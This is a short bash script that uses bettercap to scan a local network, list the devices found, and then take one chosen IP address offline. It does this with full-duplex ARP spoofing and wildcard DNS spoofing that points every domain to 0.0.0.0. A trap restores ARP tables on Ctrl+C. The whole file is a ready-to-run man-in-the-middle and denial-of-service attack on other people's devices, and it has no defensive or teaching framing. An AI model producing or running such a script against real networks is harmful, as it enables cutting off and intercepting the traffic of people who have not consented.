#!/bin/bash

# Check if bettercap is installed
if ! command -v bettercap &> /dev/null
then
    echo "bettercap could not be found. Please install it first."
    exit 1
fi

# Get network interface
INTERFACE=$(ip route | grep default | awk '{print $5}')
echo "Using network interface: $INTERFACE"

# Get gateway IP
GATEWAY_IP=$(ip route | grep default | awk '{print $3}')
echo "Gateway IP: $GATEWAY_IP"

# Scan network using bettercap and save output
echo "Scanning network for devices..."
bettercap -iface $INTERFACE -eval "net.probe on; sleep 10; net.show" > bettercap_scan.txt

# Parse bettercap output to extract IP and device names
echo "Devices found on the network:"
grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}.*' bettercap_scan.txt | while read -r line; do
    ip=$(echo $line | awk '{print $1}')
    name=$(echo $line | cut -d ' ' -f2-)
    echo "IP: $ip - Name: $name"
done

# Ask user for IP to block
read -p "Enter the IP address of the target to block internet: " TARGET_IP

# Confirm IP is in the list
if ! grep -q "$TARGET_IP" bettercap_scan.txt; then
    echo "IP address not found in scan results. Exiting."
    exit 1
fi

# Function to restore ARP tables
function restore_arp() {
    echo -e "\nRestoring network..."
    arping -c 3 -I $INTERFACE -s $GATEWAY_IP $TARGET_IP > /dev/null 2>&1
    arping -c 3 -I $INTERFACE -s $TARGET_IP $GATEWAY_IP > /dev/null 2>&1
    echo "ARP tables restored. Exiting."
    exit 0
}

# Trap Ctrl+C to restore network before exiting
trap restore_arp INT

echo "Starting persistent ARP and DNS spoofing to block internet for $TARGET_IP..."

bettercap -iface $INTERFACE -eval "
net.probe on;
net.recon on;
set arp.spoof.targets $TARGET_IP;
set arp.spoof.fullduplex true;
arp.spoof on;
set dns.spoof.domains *;
set dns.spoof.address 0.0.0.0;
dns.spoof on;
"

# When you press Ctrl+C, restore_arp will run automatically
